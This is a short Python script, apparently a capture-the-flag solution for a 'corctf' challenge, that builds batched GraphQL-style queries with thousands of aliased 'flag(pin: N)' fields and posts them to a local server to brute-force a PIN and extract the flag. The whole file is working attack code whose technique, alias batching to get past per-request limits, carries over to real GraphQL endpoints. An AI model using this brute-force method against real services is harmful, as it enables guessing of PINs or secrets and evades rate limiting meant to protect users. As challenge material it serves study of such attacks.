import string
import requests
import time
import re
chr = string.ascii_lowercase + string.ascii_uppercase
k = 1
grep = 9*10**3

def prepare_payload(start, end):
  global k
  payload = "{"
  for i in range(start,end):
    if (i % 52 == 0):
      k += 1
    payload += f"{chr[i%52]*k}:flag(pin: {i})\n"
  payload += "}"
  return payload

for i in range(0,10):
  start = grep*i
  end = grep*(i+1)
  data = prepare_payload(start,end)
  print(f"length:{end-start}")
  r = requests.post("http://0.0.0.0:9000/",headers={"Content-Type":"text/plain"},data=data)
  if "corctf" in r.text:
    # print(r.text)
    print(re.search(r"corctf{.*?}",r.text)[0])
    print("True")
    break
  else:
    print(r.text)
    print("False")
    start = end
    end += grep
  time.sleep(5)
